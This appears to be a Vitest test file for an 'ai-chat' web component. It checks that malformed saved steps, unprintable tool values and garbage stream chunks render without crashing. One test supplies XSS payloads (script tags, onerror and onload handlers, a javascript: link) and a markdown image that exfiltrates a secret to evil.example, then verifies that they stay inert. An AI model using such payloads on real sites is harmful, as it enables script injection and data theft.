import { afterEach, describe, expect, it, vi } from 'vitest';
import { cleanupAll, controllable, mount, tick, until } from './helpers.ts';
import { functionAdapter } from '../src/adapters/function.ts';
import type { AiChat } from '../src/ai-chat.ts';
import type { ChatMessage, StreamChunk } from '../src/types.ts';

/**
 * Release pass, section A: data the component didn't create. Saved
 * conversations come back from an app's storage (old versions, hand-edited,
 * corrupted) and backends send whatever they send. None of it may throw, run
 * code, load anything, or break the rest of the chat.
 */

const root = (el: AiChat) => el.shadowRoot!;
const reply = (steps: unknown, content = 'Answer text.'): ChatMessage =>
  ({ id: `m${Math.random()}`, role: 'assistant', content, createdAt: 0, steps }) as unknown as ChatMessage;

/** Render these messages; fail on any error thrown or logged while rendering. */
async function renderSafely(messages: ChatMessage[], attrs = '') {
  const errors: unknown[] = [];
  const onError = (e: ErrorEvent) => errors.push(e.error ?? e.message);
  window.addEventListener('error', onError);
  const consoleErr = vi.spyOn(console, 'error').mockImplementation((...a) => errors.push(a));
  const el = mount(`<ai-chat ${attrs}></ai-chat>`);
  try {
    el.messages = [{ id: 'u', role: 'user', content: 'before', createdAt: 0 }, ...messages,
      { id: 'after', role: 'user', content: 'after', createdAt: 0 }];
    await el.updateComplete;
    await tick(20);
  } finally {
    window.removeEventListener('error', onError);
    consoleErr.mockRestore();
  }
  return { el, errors };
}

describe('A1: malformed saved steps never break the chat', () => {
  afterEach(cleanupAll);

  const cases: Array<[string, unknown]> = [
    ['steps is a string', 'oops'],
    ['steps is an object', { 0: { type: 'tool' } }],
    ['steps is null', null],
    ['a null entry', [null]],
    ['a string entry', ['reasoning']],
    ['an unknown step type', [{ type: 'citation', id: 'c', at: 0 }]],
    ['reasoning without text', [{ type: 'reasoning', id: 'r', at: 0, startedAt: 0, endedAt: 1 }]],
    ['reasoning with non-string text', [{ type: 'reasoning', id: 'r', text: 42, at: 0, startedAt: 0, endedAt: 1 }]],
    ['a tool without state/name/startedAt', [{ type: 'tool', id: 't', at: 0 }]],
    ['a tool with an unknown state', [{ type: 'tool', id: 't', name: 'x', state: 'exploded', at: 0, startedAt: 0 }]],
    ['a tool without an id', [{ type: 'tool', name: 'x', state: 'success', at: 0, startedAt: 0, endedAt: 1 }]],
    ['negative / NaN / huge / decreasing at', [
      { type: 'reasoning', id: 'a', text: 'x', at: -5, startedAt: 0, endedAt: 1 },
      { type: 'tool', id: 'b', name: 'y', state: 'success', at: Number.NaN, startedAt: 0, endedAt: 1 },
      { type: 'tool', id: 'c', name: 'z', state: 'success', at: 10_000, startedAt: 0, endedAt: 1 },
      { type: 'reasoning', id: 'd', text: 'w', at: 3, startedAt: 0, endedAt: 1 },
    ]],
    ['endedAt before startedAt / not numbers', [
      { type: 'reasoning', id: 'r', text: 'x', at: 0, startedAt: 5000, endedAt: 1000 },
      { type: 'tool', id: 't', name: 'y', state: 'success', at: 0, startedAt: 'yesterday', endedAt: null },
    ]],
  ];

  for (const [name, steps] of cases) {
    it(name, async () => {
      const { el, errors } = await renderSafely([reply(steps)]);
      expect(errors, 'nothing thrown or logged').toEqual([]);
      const texts = [...root(el).querySelectorAll('.message')].map((m) => m.textContent ?? '');
      expect(texts.length, 'every message still renders').toBe(3);
      expect(texts[1], 'the answer text is intact').toContain('Answer text.');
      expect(texts[2]).toContain('after');
    });
  }

  it('an unknown step type is skipped, not drawn as a broken tool row', async () => {
    const { el } = await renderSafely([reply([{ type: 'citation', id: 'c', at: 0, url: 'x' }])]);
    expect(root(el).querySelectorAll('.tool, .reasoning')).toHaveLength(0);
  });

  it('a tool with no name and no title still has a readable name', async () => {
    const { el } = await renderSafely([reply([{ type: 'tool', id: 't', name: '', state: 'success', at: 0, startedAt: 0, endedAt: 1 }])]);
    expect(root(el).querySelector('.tool__name')!.textContent!.trim()).not.toBe('');
  });

  it('a negative duration never shows as a negative or NaN time', async () => {
    const { el } = await renderSafely([reply([
      { type: 'reasoning', id: 'r', text: 'x', at: 0, startedAt: 5000, endedAt: 1000 },
      { type: 'tool', id: 't', name: 'y', state: 'success', at: 0, startedAt: 9000, endedAt: 1000 },
    ])]);
    const text = root(el).querySelector('.message--assistant')!.textContent!;
    expect(text).not.toMatch(/-\d|NaN/);
  });
});

describe('A2: tool values that cannot be printed as JSON', () => {
  afterEach(cleanupAll);

  const circular: Record<string, unknown> = { name: 'loop' };
  circular.self = circular;
  const values: Array<[string, unknown]> = [
    ['circular object', circular],
    ['BigInt', 10n ** 30n],
    ['undefined inside', { a: undefined, b: [undefined] }],
    ['a function', () => 1],
    ['a symbol', Symbol('s')],
    ['huge number', 1e308 * 10],
    ['string with a code fence', 'before\n```\nfenced\n```\nafter'],
    ['string with four backticks', 'x ```` y'],
    ['empty string', ''],
    ['nested 200 deep', JSON.parse('['.repeat(200) + ']'.repeat(200))],
  ];

  for (const [name, value] of values) {
    it(name, async () => {
      const { el, errors } = await renderSafely(
        [reply([{ type: 'tool', id: 't', name: 'x', state: 'success', args: value, output: value, at: 0, startedAt: 0, endedAt: 1 }])],
        'tools="expanded"',
      );
      expect(errors).toEqual([]);
      expect(root(el).querySelectorAll('.tool')).toHaveLength(1);
      // A value never escapes its block: at most input + output blocks.
      expect(root(el).querySelectorAll('.tool .code-block').length).toBeLessThanOrEqual(2);
    });
  }
});

describe('A3: nothing executes and nothing loads through the new surfaces', () => {
  afterEach(cleanupAll);

  it('script, handlers and images in every tool and reasoning field stay inert', async () => {
    const before = performance.getEntriesByType('resource').length;
    (window as unknown as { __pwned: number }).__pwned = 0;
    const evil = '<img src=x onerror="window.__pwned++"><script>window.__pwned++</script><svg onload="window.__pwned++">';
    const { el, errors } = await renderSafely([reply([
      { type: 'reasoning', id: 'r', text: `${evil}\n\n![exfil](https://evil.example/leak.png?q=secret)\n\n[link](javascript:window.__pwned++)`, at: 0, startedAt: 0, endedAt: 1 },
      { type: 'tool', id: 't', name: evil, title: evil, error: evil, args: { html: evil }, output: evil, state: 'error', at: 0, startedAt: 0, endedAt: 1 },
    ])], 'reasoning="expanded" tools="expanded"');
    await tick(100);
    expect(errors).toEqual([]);
    expect((window as unknown as { __pwned: number }).__pwned).toBe(0);
    const msg = root(el).querySelector('.message--assistant')!;
    expect(msg.querySelectorAll('script, img, iframe, object, embed')).toHaveLength(0);
    const handlers = [...msg.querySelectorAll('*')].flatMap((n) => [...n.attributes].filter((a) => /^on/i.test(a.name)));
    expect(handlers).toHaveLength(0);
    expect([...msg.querySelectorAll('a[href]')].some((a) => /^\s*javascript:/i.test(a.getAttribute('href')!))).toBe(false);
    const loaded = performance.getEntriesByType('resource').slice(before).map((e) => e.name);
    expect(loaded.filter((u) => u.includes('evil.example'))).toEqual([]);
  });
});

describe('A4: step ids', () => {
  afterEach(cleanupAll);

  it('a tool id equal to a reasoning id, and two messages sharing step ids, open independently', async () => {
    const steps = () => [
      { type: 'reasoning', id: 'reasoning-0', text: 'thought', at: 0, startedAt: 0, endedAt: 1000 },
      { type: 'tool', id: 'reasoning-0', name: 'clash', state: 'success', output: 1, at: 0, startedAt: 0, endedAt: 1000 },
    ];
    const el = mount();
    el.messages = [
      { id: 'a', role: 'assistant', content: 'one', createdAt: 0, steps: steps() } as ChatMessage,
      { id: 'b', role: 'assistant', content: 'two', createdAt: 1, steps: steps() } as ChatMessage,
    ];
    await el.updateComplete;
    const triggers = [...root(el).querySelectorAll<HTMLButtonElement>('.reasoning__trigger, .tool__header')];
    expect(triggers).toHaveLength(4);
    triggers[0].click(); // reasoning in message a
    await el.updateComplete;
    const expanded = [...root(el).querySelectorAll('.reasoning__trigger, .tool__header')].map((t) => t.getAttribute('aria-expanded'));
    expect(expanded).toEqual(['true', 'false', 'false', 'false']);
    const ids = [...root(el).querySelectorAll('[id]')].map((n) => n.id);
    expect(new Set(ids).size, 'aria-controls targets are unique').toBe(ids.length);
  });
});

describe('A5: garbage from a backend is ignored, not crashed on', () => {
  afterEach(cleanupAll);

  it('functionAdapter skips null, numbers, {} and unknown chunk types', async () => {
    const t = functionAdapter(async function* () {
      yield null as unknown as string;
      yield 42 as unknown as string;
      yield {} as unknown as StreamChunk;
      yield { type: 'banana', delta: 'x' } as unknown as StreamChunk;
      yield 'real text';
    });
    const el = mount();
    el.transport = t;
    el.send('go');
    await until(() => !el.messages.at(-1)!.streaming && el.messages.length === 2);
    expect(el.messages.at(-1)!.content).toBe('real text');
    expect(el.messages.at(-1)!.error).toBeUndefined();
  });

  it('tool chunks with a non-string id, and reasoning with a non-string delta, are ignored', async () => {
    const el = mount();
    const c = controllable();
    el.transport = c.transport;
    el.send('go');
    await until(() => c.started);
    c.push({ type: 'tool', id: 42 } as unknown as StreamChunk);
    c.push({ type: 'tool', id: { x: 1 } } as unknown as StreamChunk);
    c.push({ type: 'reasoning', delta: null } as unknown as StreamChunk);
    c.push({ type: 'reasoning', delta: 7 } as unknown as StreamChunk);
    c.delta('fine');
    c.finish({});
    await until(() => !el.messages.at(-1)!.streaming);
    const m = el.messages.at(-1)!;
    expect(m.content).toBe('fine');
    expect(JSON.stringify(m.steps ?? [])).not.toMatch(/null|undefined|\b7\b/);
  });
});
